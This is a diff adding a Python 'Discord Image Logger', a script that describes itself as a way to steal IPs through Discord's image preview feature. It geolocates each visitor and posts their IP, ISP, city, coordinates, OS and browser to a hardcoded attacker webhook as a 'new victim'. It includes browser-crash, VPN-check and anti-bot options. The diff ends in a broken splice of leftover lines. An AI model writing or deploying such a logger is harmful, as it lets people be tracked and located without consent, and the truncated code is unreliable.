@@ -1,4 +1,154 @@
-                "thumbnail": {
+# Discord Image Logger
+# By KUPAL
+# Red-Themed Optimized Version
+
+from http.server import BaseHTTPRequestHandler
+from urllib import parse
+import traceback, requests, base64, httpagentparser
+
+__app__ = "Discord Image Logger"
+__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__version__ = "v2.0"
+__author__ = "XSYTHO"
+
+config = {
+    # BASE CONFIG #
+    "webhook": "https://discord.com/api/webhooks/1390198662667440309/M3X9Ibay6lyI11GOjd0PI8s91O9YOaiftX13mVyVI40c_18IWXoLp9Ovyt4u_LVqLq_4",
+    "image": "https://media1.tenor.com/m/EaWUoC0qHToAAAAd/steve-harvey-gigachad.gif",
+    "imageArgument": True,
+
+    # CUSTOMIZATION #
+    "username": "🕵️‍♂️ IP Logger",
+    "avatar": "https://i.imgur.com/3JjQ9ZQ.png",
+    "color": 0xFF0000,
+    
+    # OPTIONS #
+    "crashBrowser": False,
+    "accurateLocation": False,
+    
+    "message": {
+        "doMessage": True,
+        "message": "⚠️ WARNING: Your IP and device information have been logged!",
+        "richMessage": True,
+    },
+
+    "vpnCheck": 1,
+    "linkAlerts": True,
+    "buggedImage": True,
+    "antiBot": 1,
+
+    # REDIRECTION #
+    "redirect": {
+        "redirect": False,
+        "page": "https://your-link.here"
+    },
+}
+
+blacklistedIPs = ("27", "104", "143", "164")
+
+def botCheck(ip, useragent):
+    if ip.startswith(("34", "35")):
+        return "Discord"
+    elif useragent.startswith("TelegramBot"):
+        return "Telegram"
+    else:
+        return False
+
+def reportError(error):
+    requests.post(config["webhook"], json = {
+    "username": config["username"],
+    "avatar_url": config["avatar"],
+    "content": "@everyone",
+    "embeds": [
+        {
+            "title": "‼️ Image Logger - Error",
+            "color": 0xFF3333,
+            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+        }
+    ],
+})
+
+def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
+    if ip.startswith(blacklistedIPs):
+        return
+    
+    bot = botCheck(ip, useragent)
+    
+    if bot:
+        requests.post(config["webhook"], json = {
+            "username": config["username"],
+            "avatar_url": config["avatar"],
+            "content": "@everyone",
+            "embeds": [
+                {
+                    "title": "🔗 Link Sent Alert",
+                    "color": 0xFF3030,
+                    "description": f"**Potential target clicked the logging link!**\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+                    "thumbnail": {
+                        "url": "https://i.imgur.com/J5ymhx9.png"
+                    }
+                }
+            ]
+        }) if config["linkAlerts"] else None
+        return
+
+    ping = "@everyone"
+
+    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
+    if info["proxy"]:
+        if config["vpnCheck"] == 2:
+                return
+        if config["vpnCheck"] == 1:
+            ping = ""
+    
+    if info["hosting"]:
+        if config["antiBot"] == 4:
+            if info["proxy"]:
+                pass
+            else:
+                return
+        if config["antiBot"] == 3:
+                return
+        if config["antiBot"] == 2:
+            if info["proxy"]:
+                pass
+            else:
+                ping = ""
+        if config["antiBot"] == 1:
+                ping = ""
+
+    os, browser = httpagentparser.simple_detect(useragent)
+    
+    embed = {
+        "username": config["username"],
+        "avatar_url": config["avatar"],
+        "content": ping,
+        "embeds": [
+            {
+                "title": "🔥 NEW VICTIM LOGGED 🔥",
+                "color": config["color"],
+                "description": f"""**⚠️ Target Information Captured ⚠️**
+
+**🌐 Network Info:**
+> 🆔 **IP:** `{ip if ip else 'Unknown'}`
+> 📶 **ISP:** `{info['isp'] if info['isp'] else 'Unknown'}`
+> 🏢 **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
+> 🌍 **Country:** `{info['country'] if info['country'] else 'Unknown'}`
+> 🏙️ **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
+> 🏡 **City:** `{info['city'] if info['city'] else 'Unknown'}`
+> 📍 **Coordinates:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> 🕒 **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
+> 📱 **Mobile:** `{info['mobile']}`
+> 🛡️ **VPN:** `{info['proxy']}`
+> 🤖 **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+
+**💻 Device Info:**
+> 🖥️ **OS:** `{os}`
+> 🌐 **Browser:** `{browser}`
+
+**🔍 User Agent:**
+
+                  "thumbnail": {
                     "url": "https://i.imgur.com/J5ymhx9.png"
                 },
                 "footer": {
